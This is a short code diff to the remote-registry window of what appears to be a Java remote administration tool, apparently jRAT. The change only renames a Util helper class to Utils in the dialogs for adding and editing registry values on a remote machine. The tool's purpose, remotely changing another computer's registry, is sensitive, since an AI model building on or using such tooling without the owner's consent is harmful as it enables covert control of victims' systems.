@@ -35,7 +35,7 @@ import pro.jrat.packets.outgoing.Packet79BrowseRegistry;
 import pro.jrat.packets.outgoing.Packet80CustomRegQuery;
 import pro.jrat.ui.renderers.JComboBoxIconRenderer;
 import pro.jrat.utils.IconUtils;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 
 @SuppressWarnings({"serial", "rawtypes"})
@@ -328,15 +328,15 @@ public class FrameRemoteRegistry extends BaseFrame {
 	}
 	
 	public void addValue() {
-		String name = Util.showDialog("Add Value", "Input the name of the value to be created");
+		String name = Utils.showDialog("Add Value", "Input the name of the value to be created");
 		if (name == null) {
 			return;
 		}
-		String type = Util.showDialog("Add Value", "Input type of value to be created, like:\n\nREG_SZ, REG_MULTI_SZ, REG_DWORD");
+		String type = Utils.showDialog("Add Value", "Input type of value to be created, like:\n\nREG_SZ, REG_MULTI_SZ, REG_DWORD");
 		if (type == null) {
 			return;
 		}
-		String data = Util.showDialog("Add Value", "Input the data to assign to the value being added");
+		String data = Utils.showDialog("Add Value", "Input the data to assign to the value being added");
 		if (data == null) {
 			return;
 		}
@@ -358,7 +358,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		if (row != -1) {
 			String val = model.getValueAt(row, 1).toString();
 			String type = model.getValueAt(row, 3).toString();
-			String data = Util.showDialog("Edit Value", "Input the data to replace the current data with");		
+			String data = Utils.showDialog("Edit Value", "Input the data to replace the current data with");		
 			if (data == null) {
 				return;
 			}
